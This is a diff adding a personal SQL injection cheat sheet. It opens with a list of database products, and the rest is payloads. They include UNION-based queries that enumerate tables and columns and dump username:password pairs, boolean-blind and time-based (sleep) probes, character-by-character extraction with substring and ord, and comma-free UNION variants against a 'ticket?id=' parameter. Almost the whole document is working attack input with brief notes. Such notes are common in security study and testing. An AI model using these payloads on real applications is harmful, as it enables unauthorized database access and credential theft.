@@ -1,0 +1,85 @@
+Relational Databases:
+
+MySQL
+PostgreSQL
+SQLite
+Oracle
+Microsoft SQL Server (MSSQL)
+MariaDB
+IBM DB2
+Sybase
+
+NoSQL Databases:
+
+MongoDB
+Redis
+Cassandra
+CouchDB
+DynamoDB
+Elasticsearch
+
+NewSQL:
+
+Google Spanner
+CockroachDB
+TiDB
+
+
+UNION SELECT 1,@@version;- -
+' UNION SELECT 1, database()--
+UNION SELECT 1,current_user();- - [ hostname()]
+' UNION SELECT 1, table_name FROM information_schema.tables--
+' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = 'users'--
+' UNION SELECT 1, concat(username, ':', password) FROM users--
+1' UNION SELECT 1,tablename FROM informationschema.tables;- -
+1’ and length(database())=1;--  [1,2,3,4]
+1' and substring(database(),1,1)='a';- - [1st cahracter a,b,c,d]
+1' and substring(database(),2,1)='v';- - [2nd cahracter a,b,c,d]
+1' AND sleep(10);- -
+1' and if((select+@@version) like "10%",sleep(2),null);- -+
+
+' or 1 like 1-- - [ alternative or ' or 1 = 1 -- -]
+' or (select 1) like 1-- -
+' or (select schema_name from information_schema.schemata limit 1) like 1-- -
+' or (select 1 from user limit 1) like 1-- -
+' or (select 1 from user[can guess only one parameter and fuzz table name] limit 1) like 2-- -
+' or (select username[can guess only one parameter and fuzz column name] from user limit 1) like 2-- -
+' or (select username from user limit 1) like 'admin'-- - [ to extract data]
+
+*******
+SQL sytanx = select username from users limit 1,2; [1,2 offset: how many entries we want]
+' or (select username from user limit 1 offset 0) like 'admin'-- - [ to extract data, this will match exacat value in table and match with our "admin" word if both matches it will gives match result 0]
+
+****
+to check username length 
+' or (select length(username) from user limit 1 offset 0) like 1-- - [5 is length of username ex: admin = 5]
+' or (select length(username) from user limit 1 offset 0) like 2-- - [5 is length of username ex: admin = 5]
+' or (select length(username) from user limit 1 offset 0) like 5-- - [5 is length of username ex: admin = 5]
+
+
+******
+so doing this is hard to guess exact word so we can guess words by one bye one character by using substring command.
+SQL syntax = select substr(username,1,1) from users limit 1 offset 0; [it give first charcter of word "admin" so it will gives 'a']
+SQL syntax2 = select substr(username from 1 for 1) from users limit 1 offset 0; [it give first charcter of word "admin" so it will gives 'a']
+' or (select substring(username from 1 for 1) from user limit 1 offset 0) like a-- -
+>> convert into ord format
+' or (select ord(substr(username from 1 for 1)) from user limit 1 offset 0) like 97-- - [97 is ascii 'a']
+' or (select ord(substr(username from 1 for 1)) from user limit 1 offset 0) like between 0 AND 97-- - [97 is ascii 'a']
+
+
+******
+UNION wiothout Comma
+SQL Syntax = select * from docs where id='1' UNION select 1,2,3-- -'; [ make sure 1,2,3 is available coloum in table so it must match otherwise you won't get any output, will work in SQLite]
+
+SQL Syntax = select * from docs where id='1' UNION (select * from (select 1) AS A JOIN (select 2)AS B JOIN (select 3) AS C)-- -'; [ make sure 1,2,3 is available coloum in table so it must match otherwise you won't get any output, will work in SQLite]
+
+MariaDB 
+ticket?id=1 AND 1=1 ORDER BY 3
+ticket?id=1.1 UNION SELECT 1,2,3
+ticket?id=1-1 UNION SELECT 1,2,3 [ticket?id=1 -1 UNION SELECT 1,2,3]
+
+
+1 UNION SELECT 12,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() --
+1 UNION SELECT 12,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() --
+
+
